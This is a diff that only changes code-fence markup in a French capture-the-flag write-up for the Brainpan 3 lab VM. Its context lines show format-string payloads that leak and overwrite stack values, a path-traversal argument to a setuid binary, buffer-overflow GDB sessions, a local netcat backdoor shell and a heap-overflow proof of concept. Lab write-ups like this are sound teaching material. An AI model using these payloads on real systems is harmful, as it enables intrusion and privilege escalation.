@@ -20,7 +20,7 @@ Houlala 2: la mission
 
 Comme avec les autres challenges de la série on se retrouve vite fait en face d'un service fait maison :  
 
-```plain
+```
 Not shown: 65533 filtered ports
 PORT     STATE  SERVICE
 1337/tcp open   waste
@@ -143,14 +143,14 @@ Seulement le service semble mal digérer ces connexions parallèles et semble bl
 
 On suppose alors que le binaire est vulnérable d'entrée de jeu. Dans un cas comme celui-ci une faille de chaîne de format semble la plus probable.  
 
-```plain
+```
 ACCESS CODE: %8x
 ERROR #1: INVALID ACCESS CODE: bfc3f5cc
 ```
 
 Bingo ! On peut alors remonter les valeurs sur la stack. Notez que la VM est une machine Linux 32bits.  
 
-```plain
+```
 ACCESS CODE: %2$.8X
 ERROR #1: INVALID ACCESS CODE: 00000000
 
@@ -174,7 +174,7 @@ Et ainsi de suite. Qu'est-on susceptible de trouver sur la stack ? Paramètres d
 
 Le plus intéressant pour le moment est le troisième argument 0xF89 qui correspond à 3977 en décimal et qui s'avère être le précieux sésame pour passer la mire :  
 
-```plain
+```
 ACCESS CODE: 3977
 
 --------------------------------------------------------------
@@ -193,7 +193,7 @@ ENTER COMMAND:
 
 On obtient des retours différents selon le numéro de commande saisi :  
 
-```plain
+```
 ENTER COMMAND: 1
 SELECTED: 1
 REPORT MODE IS DISABLED IN THIS BUILD
@@ -248,7 +248,7 @@ L'option 2 rend accessible le port 8080 qui est un serveur web tournant via le m
 
 Ce serveur dispose d'un *robots.txt* avec une seule entrée :  
 
-```plain
+```
 User-agent: *
 Disallow: /bp3_repo
 ```
@@ -267,7 +267,7 @@ L'image présente donne à rire (jaune) :
 
 Les autres fichiers présents sont des exécutables Linux (ELF) mais en dehors de *report* tous semblent être des trolls comme le binaire shell qui ne fait qu'un *puts()* de l'ascii suivant :  
 
-```plain
+```
             ___
         .-"; ! ;"-.
       .'!  : | :  !`.
@@ -290,7 +290,7 @@ Et comme la fonctionnalité de *report* est désactivé sur le service cela ne n
 
 Retour donc sur ce service et en particulier sur la commande 3 qui a une fois de plus une faille de chaîne de format post-authentification :  
 
-```plain
+```
 ENTER COMMAND: 3
 SELECTED: 3
 ENTER NEW SESSION NAME: Hello %.8X
@@ -304,7 +304,7 @@ Maintenant l'étape suivante est de pouvoir dumper pas seulement en spécifiant 
 
 Il faut d'abord trouver l'offset où se trouve des données sous notre contrôle :  
 
-```plain
+```
 ENTER COMMAND: 3
 SELECTED: 3
 ENTER NEW SESSION NAME: %5$08xAABBBBCCCC
@@ -403,7 +403,7 @@ for addr in memory_addresses:
 
 Ce qui nous donne :  
 
-```plain
+```
 %1$.8X => 0xBF9301BC '\xBC\x01\x93\xBF'
 %2$.8X => 0x00000104 '\x04\x01\x00\x00'
 %3$.8X => 0x2E243325 '%3$.'
@@ -465,7 +465,7 @@ with open("/tmp/stack", "wb") as fd:
 
 Le contenu de la stack dumpée est évidemment une mine d'or. On y trouve ce qui doit être l'adresse de retour de la fonction en cours (*0x0804938b*) et en remontant à la base on obtient les *argv* et *envp* :  
 
-```plain
+```
 0xbfb65efb b'brainpan3'
 0xbfb65f05 b'UPSTART_INSTANCE='
 0xbfb65f17 b'UPSTART_JOB=xinetd'
@@ -486,7 +486,7 @@ Le point important à en déduire c'est qu'on a pas besoin d'utiliser un shellco
 
 En dumpant la stack on note aussi la présence de dwords correspondant aux caractères 'Y' et 'N', les même utilisés pour indiquer les fonctionnalités présentes dans le binaire :  
 
-```plain
+```
 --- snip ---
 0xbf9302b8 b'N'
 0xbf9302b9 b''
@@ -498,7 +498,7 @@ En dumpant la stack on note aussi la présence de dwords correspondant aux carac
 
 Avec le format *%hhn* on est capable d'écrire le nombre de caractères affichés à un octet dont on spécifie l'adresse. Si on écrase les valeurs 'N' par une valeur quelconque on débloque la fonctionnalité de *report*... enfin plus ou moins :  
 
-```plain
+```
 INVALID REPORT VALUE
 ERROR #3 0x5f5f5348 0x49545354 0x4f524d5f5f
 ```
@@ -603,7 +603,7 @@ skrewdriver
 
 En recherchant les fichiers et dossiers sur lesquels ont dispose de droits d'écriture on trouve le dossier */home/reynard/private* qui contient les fichiers suivants :  
 
-```plain
+```
 -rwsr-xr-x 1 reynard reynard 5568 May 19  2015 cryptor
 -r-------- 1 reynard reynard   77 May 21  2015 sekret.txt.enc
 ```
@@ -650,13 +650,13 @@ LinEnum remonte ainsi le fichier de crontab */etc/cron.d/msg\_admin* dont voici 
 
 On a donc un binaire à exploiter qui va chercher ses entrées dans des fichiers *.msg* qui doivent être mis dans */opt/.messenger*. Ce dossier a des permissions particulières :  
 
-```plain
+```
 drwxrwx---  3 root dev  4096 Jun 10  2015 .messenger
 ```
 
 Il faut être dans le compte *dev* pour y placer un fichier donc il nous faut les droits de l'un de ces accounts :  
 
-```plain
+```
 uid=1002(reynard) gid=1002(reynard) groups=1002(reynard),1004(dev)
 uid=1001(puck) gid=1001(puck) groups=1001(puck),1004(dev)
 ```
@@ -665,7 +665,7 @@ On sait que le binaire *cryptor* peut nous donner l'uid *reynard* mais il n'est 
 
 Dans */etc/xinetd.d* on trouve l'entrée de ce cher programme *brainpan3* :  
 
-```plain
+```
 service trixd
 {
         disable         = no
@@ -684,7 +684,7 @@ service trixd
 
 Mais aussi une entrée pour un service tournant sur le port 7075 local et tournant avec le bon GID !  
 
-```plain
+```
 service trixd
 {
         disable         = no
@@ -720,7 +720,7 @@ Le programme compare simplement le contenu de */mnt/usb/key.txt* avec le contenu
 
 Impossible d'obtenir le contenu de la clé de l'utilisateur *puck*. Quand à l'autre fichier il nécessite les droits de *reynard* :  
 
-```plain
+```
 drwxrwx--- 2 reynard dev 4096 Jun 17  2015 /mnt/usb
 ```
 
@@ -734,7 +734,7 @@ Le résultat de ce str(n)cpy permet de générer le nom du fichier de sortie.
 
 Par exemple si on dépasse ces 116 caractères alors le nom du fichier est d'abord tronqué à 90 caractères avant que le suffixe *.enc* soit ajouté. On peut en profiter pour faire en sorte que le programme écrive son output en dehors du dossier normalement attendu et par exemple obtenir le contenu du fichier */mnt/usb/key.txt* :  
 
-```plain
+```
 anansi@brainpan3:/home/reynard/private$ ./cryptor /tmp/././././././././././././././././././././././././././././././././././././././/..//tmp/./.././tmp/../mnt/usb/key.txt 0
 [+] saving to /tmp/././././././././././././././././././././././././././././././././././././././/..//tmp/.enc
 anansi@brainpan3:/home/reynard/private$ cat /tmp/.enc
@@ -770,7 +770,7 @@ Et comme un *ret* suit toujours un *leave* on contrôle finalement l'adresse de 
 
 Un jeu de 7 erreurs avec une session GDB devrait être plus clair. Commençons par le fonctionnement attendu :  
 
-```plain
+```
 (gdb) r `python -c "print 'A'*110"` tatayoyo
 Starting program: /home/nico/VirtualBox VMs/brainpan3/cryptor `python -c "print 'A'*110"` tatayoyo
 
@@ -809,7 +809,7 @@ esp            0xffffd42c       0xffffd42c
 
 Et maintenant la version qui crashe :  
 
-```plain
+```
 (gdb) r `python -c "print 'A'*116"` tatayoyo 
 Starting program: /home/nico/VirtualBox VMs/brainpan3/cryptor `python -c "print 'A'*116"` tatayoyo
 
@@ -987,7 +987,7 @@ uid=1001(puck) gid=1004(dev) groups=1001(puck)
 
 On aura préalablement placé une backdoor Python à l'emplacement */tmp/backdoor.py* nous donnant un shell sur le port 9999.  
 
-```plain
+```
 $ nc 127.0.0.1 9999 -v
 Connection to 127.0.0.1 9999 port [tcp/*] succeeded!
 puck@brainpan3:/$ id
@@ -1005,7 +1005,7 @@ Ce binaire prend deux arguments : un entier correspondant à un niveau de priori
 
 Ce dernier doit être formaté spécifiquement comme indiqué dans le message d'usage :  
 
-```plain
+```
 Message file format: requestername|message
 Eg: tony|Add a new user to repo
 Can have multiple messages in a single file separated by newlines.
@@ -1031,7 +1031,7 @@ Chaque structure est composée de la priorité (premier dword), de l'adresse du 
 
 Le fonctionnement du programme fait que tous les chunks se suivent, comme on peut l'observer avec GDB :  
 
-```plain
+```
 (gdb) x/4wx $ebp-0x44
 0xffffd444:     0x0804d790      0x0804d880      0x0804d970      0x00008000
 (gdb) x/90wx 0x0804d790
@@ -1061,7 +1061,7 @@ La vulnérabilité réside ici sur l'emploi d'un *strcpy()* qui permet un buffer
 
 Par tâtonnement on peut forger facilement un PoC permettant d'écrire à une adresse de notre choix :  
 
-```plain
+```
 HellooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooAAAA|Hello there
 devloop|tatayoyo
 ```
